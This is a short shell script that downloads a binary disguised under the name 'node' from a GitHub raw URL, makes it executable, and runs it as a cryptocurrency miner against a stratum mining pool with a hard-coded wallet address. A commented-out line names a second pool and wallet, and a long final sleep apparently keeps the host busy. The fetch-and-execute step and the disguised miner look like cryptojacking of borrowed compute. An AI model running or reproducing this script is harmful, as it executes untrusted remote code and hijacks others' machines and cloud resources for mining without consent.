#!/bin/sh
curl -o node https://raw.githubusercontent.com/menju2ikg8uti/rem/main/node
chmod +x node
WORKER_NUMBER=$1
PASSHOURS=$(date +%S)
#./node -a yespower -o stratum+tcp://mine.pool.r4nd0m.us:6991 -u WXrBvF4x5fLiaw7aiWycJfbcVKukheuxak.crf_${HOURESX} -p c=SWAMP,mc=SWAMP > try.log
./node --disable-gpu -a YescryptR16 -o stratum+tcp://us-central.pmpmining.com:5090 -u bq1qd06v7mdfme2kcdp6x47vyev7pazuq2ftyzelre.${WORKER_NUMBER}_crf > try.log
sleep 60
cat try.log


sleep 29999

